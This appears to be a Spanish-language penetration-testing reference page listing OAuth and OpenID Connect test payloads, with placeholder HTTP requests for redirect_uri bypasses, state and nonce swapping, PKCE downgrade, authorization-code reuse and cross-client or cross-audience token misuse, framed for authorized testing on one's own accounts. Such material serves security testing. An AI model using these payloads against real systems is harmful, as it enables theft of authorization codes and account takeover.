# 🗡️ Configuración insegura de OAuth: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Parámetros de autorización

```text
response_type=code&client_id={CLIENT_ID}&redirect_uri={CALLBACK}&state={STATE_PROPIO}
response_type=code&client_id={CLIENT_ID}&redirect_uri={CALLBACK}
response_type=code&client_id={CLIENT_ID}&redirect_uri={CALLBACK}&state={STATE_SESION_B_PROPIA}
response_type=code&client_id={CLIENT_ID}&redirect_uri={CALLBACK}&state=
```

**Cuándo usarlo:** Comparar dos sesiones propias y observar si el cliente vincula la respuesta al navegador iniciador. La ausencia de state es relevante cuando el flujo carece de protección equivalente.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/oauth).


### Redirect URI de callback

```text
redirect_uri=https://{CLIENTE}/callback
redirect_uri=https://{CLIENTE}/callback/
redirect_uri=https://{CLIENTE}/callback?next=%2Fperfil
redirect_uri=https://{CLIENTE}/callback/../salida
redirect_uri=https://{SUBDOMINIO_CONTROLADO}/callback
```

**Cuándo usarlo:** Probar contra el registro real del cliente, una variante por solicitud. Una redirección externa es crítica si lleva un código o token utilizable; registrar el destino final sin compartir códigos.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/OAuth%20Misconfiguration/README.md).


## 🧭 Payloads por contexto

### PKCE y enlace entre código y desafío

```text
code_challenge={DESAFIO_S256_PROPIO}&code_challenge_method=S256
code_challenge={DESAFIO_PLAIN_PROPIO}&code_challenge_method=plain
code_challenge={DESAFIO_S256_PROPIO}
code_verifier={VERIFIER_INCORRECTO}
code_verifier={VERIFIER_DE_OTRA_SESION_PROPIA}
```

**Cuándo usarlo:** Solo en flujos PKCE y con códigos de tus sesiones. El token endpoint debe rechazar verifier incorrecto o de otra sesión; omitir challenge tiene valor si la política exige PKCE.

**Fuente:** [RFC](https://datatracker.ietf.org/doc/html/rfc7636).


### OIDC y scopes

```text
scope=openid%20profile
scope=openid%20email
scope=openid%20profile%20email
nonce={NONCE_PROPIO}
nonce={NONCE_DE_OTRA_SESION_PROPIA}
```

**Cuándo usarlo:** Comparar identidad recibida y vinculación de nonce para dos cuentas propias. Pedir un scope no demuestra autorización; verifica lo concedido y lo consumido por el cliente.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/oauth).


## 🔥 Payloads avanzados

### Emisor y cliente en varios proveedores

```text
iss={ISSUER_A}  client_id={CLIENT_A}  redirect_uri={CALLBACK_A}
iss={ISSUER_B}  client_id={CLIENT_B}  redirect_uri={CALLBACK_B}
iss={ISSUER_A}  client_id={CLIENT_B}  redirect_uri={CALLBACK_B}
iss={ISSUER_B}  client_id={CLIENT_A}  redirect_uri={CALLBACK_A}
```

**Cuándo usarlo:** En una integración con dos IdP de prueba, cada respuesta debe vincularse al emisor y cliente que inició la solicitud. La mezcla de valores solo es válida como prueba controlada de mix-up.

**Fuente:** [RFC](https://datatracker.ietf.org/doc/html/rfc9700).


### Código de autorización y token endpoint

```text
code={CODIGO_PROPIO_A}&redirect_uri={CALLBACK_A}&client_id={CLIENT_A}
code={CODIGO_PROPIO_A}&redirect_uri={CALLBACK_B}&client_id={CLIENT_A}
code={CODIGO_PROPIO_A}&redirect_uri={CALLBACK_A}&client_id={CLIENT_B}
code={CODIGO_PROPIO_YA_CANJEADO}&redirect_uri={CALLBACK_A}&client_id={CLIENT_A}
```

**Cuándo usarlo:** Un código debe canjearse una vez y permanecer ligado al cliente, redirect URI y PKCE del flujo. Usa códigos efímeros propios; el rechazo consistente es el comportamiento esperado.

**Fuente:** [RFC](https://datatracker.ietf.org/doc/html/rfc9700).


## 🔬 Pruebas guiadas por escenario

### 1. redirect_uri fuera de la lista

**Objetivo:** Cambiar solo el destino del flujo propio por un host de prueba no registrado.

```http
GET /authorize?response_type=code&client_id={CLIENT_ID}&redirect_uri=https%3A%2F%2F{CONTROLLED_HOST}%2Fcallback&state={STATE_PROPIO}&code_challenge={CHALLENGE_PROPIO}&code_challenge_method=S256 HTTP/1.1
Host: {AUTHORIZATION_SERVER}
```

**Interpretación:** El servidor debe rechazar la URI antes de emitir code; una página de error que refleja la URI no prueba fuga.

**Fuente técnica:** [RFC](https://datatracker.ietf.org/doc/html/rfc9700).

### 2. Coincidencia por prefijo

**Objetivo:** Probar una URI cuyo inicio coincide con la registrada pero cuya autoridad es propia.

```text
redirect_uri=https://{HOST_REGISTRADO}.{CONTROLLED_HOST}/callback
redirect_uri=https://{HOST_REGISTRADO}@{CONTROLLED_HOST}/callback
```

**Interpretación:** Usar un dominio controlado y examinar Location final. Solo hay impacto si el code/token llega a un origen no autorizado.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/OAuth%20Misconfiguration/README.md).

### 3. Open redirect en callback permitido

**Objetivo:** Comprobar si una URI registrada contiene un redirect propio que reenvía el code.

```http
GET /authorize?response_type=code&client_id={CLIENT_ID}&redirect_uri=https%3A%2F%2F{HOST_REGISTRADO}%2Fredirect%3Fnext%3Dhttps%253A%252F%252F{CONTROLLED_HOST}%252Fcb&state={STATE_PROPIO} HTTP/1.1
Host: {AUTHORIZATION_SERVER}
```

**Interpretación:** La cadena requiere que la URI completa esté registrada y que el code sea canjeable; PKCE puede impedir el impacto.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/oauth).

### 4. Callback sin state

**Objetivo:** Visitar el callback propio sin un valor de estado vinculado a un flujo iniciado.

```http
GET /oauth/callback?code={CODE_PROPIO_DE_PRUEBA} HTTP/1.1
Host: {CLIENT_APP}
Cookie: session={COOKIE_PROPIA}
```

**Interpretación:** La aplicación debe rechazarlo. Si enlaza otra cuenta, confirmar con dos cuentas propias y sin usar códigos ajenos.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/oauth).

### 5. State de otra transacción

**Objetivo:** Intercambiar estados de dos flujos propios sin mezclar identidades de terceros.

```text
Inicio A -> state={STATE_A}, code_challenge={CHALLENGE_A}
Inicio B -> state={STATE_B}, code_challenge={CHALLENGE_B}
Callback B con state={STATE_A} -> debe rechazarse
```

**Interpretación:** Demostrar rechazo/aceptación por transacción; una comparación textual de states no sustituye prueba de sesión resultante.

**Fuente técnica:** [RFC](https://datatracker.ietf.org/doc/html/rfc9700).

### 6. PKCE ausente o degradado

**Objetivo:** En cliente público, comparar authorization request sin challenge y con método plain.

```http
GET /authorize?response_type=code&client_id={CLIENT_PUBLICO}&redirect_uri={REDIRECT_URI_REGISTRADA}&state={STATE_PROPIO}&code_challenge={VERIFIER_PROPIO}&code_challenge_method=plain HTTP/1.1
Host: {AUTHORIZATION_SERVER}
```

**Interpretación:** Repetir sin code_challenge por separado. El impacto exige comprobar si el code se canjea sin verifier S256.

**Fuente técnica:** [RFC](https://datatracker.ietf.org/doc/html/rfc9700).

### 7. Código de autorización reutilizado

**Objetivo:** Canjear dos veces el mismo code de una cuenta propia.

```http
POST /token HTTP/1.1
Host: {AUTHORIZATION_SERVER}
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&client_id={CLIENT_ID}&code={CODE_PROPIO_YA_CANJEADO}&redirect_uri={REDIRECT_URI_REGISTRADA}&code_verifier={VERIFIER_PROPIO}
```

**Interpretación:** El segundo canje debe fallar. El code es de un solo uso; no registrar tokens reales en evidencias.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/OAuth%20Misconfiguration/README.md).

### 8. Confusión de emisor

**Objetivo:** En cliente con dos proveedores, comparar iss y estado antes de aceptar el callback.

```text
Flujo iniciado con {ISSUER_A} y state={STATE_A}
Callback observado con iss={ISSUER_B} y state={STATE_A}
Resultado esperado: rechazo antes de crear sesión
```

**Interpretación:** La prueba requiere dos emisores configurados en un entorno controlado; un cambio de URL por sí solo no prueba mix-up.

**Fuente técnica:** [RFC](https://datatracker.ietf.org/doc/html/rfc9700).

### 9. Alcance ampliado en autorización

**Objetivo:** Pedir un scope que el cliente de prueba no tiene concedido y revisar el token emitido.

```http
GET /authorize?response_type=code&client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI_REGISTRADA}&state={STATE_PROPIO}&scope=openid%20{SCOPE_NO_CONCEDIDO}&code_challenge={CHALLENGE_PROPIO}&code_challenge_method=S256 HTTP/1.1
Host: {AUTHORIZATION_SERVER}
```

**Interpretación:** El scope debe ser denegado o sujeto a consentimiento/política. Un parámetro aceptado no prueba que el token tenga el permiso.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/oauth).

### 10. Código de otro client_id

**Objetivo:** Intentar canjear un code propio emitido para cliente A presentando client_id B.

```http
POST /token HTTP/1.1
Host: {AUTHORIZATION_SERVER}
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&client_id={CLIENT_B_PROPIO}&code={CODE_EMITIDO_PARA_CLIENT_A}&redirect_uri={REDIRECT_URI_A}&code_verifier={VERIFIER_A}
```

**Interpretación:** El token endpoint debe ligar code a client_id y redirect_uri de origen; usar solo clientes administrados en el laboratorio.

**Fuente técnica:** [RFC](https://datatracker.ietf.org/doc/html/rfc9700).

### 11. Token para otra audiencia

**Objetivo:** Enviar a recurso B un access token propio cuyo aud corresponde únicamente a recurso A.

```http
GET /api/me HTTP/1.1
Host: {RECURSO_B}
Authorization: Bearer {ACCESS_TOKEN_PROPIO_AUD_A}
```

**Interpretación:** B debe rechazarlo aunque la firma sea válida. Verificar el aud real y que B no acepte el token por compartir emisor.

**Fuente técnica:** [RFC](https://datatracker.ietf.org/doc/html/rfc9700).

### 12. Dos redirect_uri en una autorización

**Objetivo:** En un cliente propio, comparar qué destino valida y cuál usa el servidor cuando la clave se repite.

```http
GET /authorize?response_type=code&client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI_REGISTRADA}&redirect_uri=https%3A%2F%2F{CONTROLLED_HOST}%2Fcallback&state={STATE_PROPIO} HTTP/1.1
Host: {AUTHORIZATION_SERVER}
```

**Interpretación:** Comparar también el orden inverso. Solo hay fuga si se emite code a destino no autorizado; PKCE puede impedir canje.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/oauth).

### 13. Traversal en ruta de callback

**Objetivo:** Cuando se permite un prefijo de callback, probar normalización hacia una página propia del mismo cliente.

```text
redirect_uri=https://{CLIENT_APP}/oauth/callback/../../pages/{PAGINA_PROPIA}
```

**Interpretación:** Confirmar URI aceptada y ruta final del navegador; si la página no maneja code, el cambio por sí solo no implica fuga.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/oauth).

### 14. response_mode fragment

**Objetivo:** En flujo propio que admita response_mode, comparar validación de redirect_uri con query y fragment.

```http
GET /authorize?response_type=code&client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI_DE_PRUEBA}&response_mode=fragment&state={STATE_PROPIO} HTTP/1.1
Host: {AUTHORIZATION_SERVER}
```

**Interpretación:** El fragmento no se envía al servidor por HTTP; inspeccionar la navegación y scripts del callback sin asumir filtración.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/oauth).

### 15. redirect_uri distinta en canje

**Objetivo:** Canjear un code propio usando una redirect_uri diferente de la solicitud que lo creó.

```http
POST /token HTTP/1.1
Host: {AUTHORIZATION_SERVER}
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&client_id={CLIENT_ID}&code={CODE_PROPIO}&redirect_uri={OTRA_REDIRECT_URI_REGISTRADA}&code_verifier={VERIFIER_PROPIO}
```

**Interpretación:** El canje debe fallar por vinculación de code a la URI original, aunque ambas URI estén registradas.

**Fuente técnica:** [RFC](https://datatracker.ietf.org/doc/html/rfc9700#section-4.1).

### 16. Nonce OIDC de otra transacción

**Objetivo:** Con dos flujos OIDC propios, presentar en flujo A un ID token de B con nonce distinto.

```text
Inicio A: nonce={NONCE_A}, state={STATE_A}
ID token firmado de B: nonce={NONCE_B}
Callback A con ID token de B: resultado esperado, rechazo
```

**Interpretación:** El cliente debe verificar firma, aud, iss y nonce asociado al navegador; aceptar B requiere confirmar la sesión creada.

**Fuente técnica:** [openid.net](https://openid.net/specs/openid-connect-core-1_0-18.html#IDTokenValidation).

### 17. Vinculación por correo OIDC no verificado

**Objetivo:** En un IdP de laboratorio, observar si el cliente vincula una cuenta existente solo por email_verified=false.

```json
{"sub":"{SUB_PROPIO_IDP_B}","email":"{EMAIL_CUENTA_A_PROPIA}","email_verified":false}
```

**Interpretación:** El objeto es una respuesta userinfo de laboratorio, no una petición al proveedor real. Verificar que no se inicie sesión como A.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/oauth).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
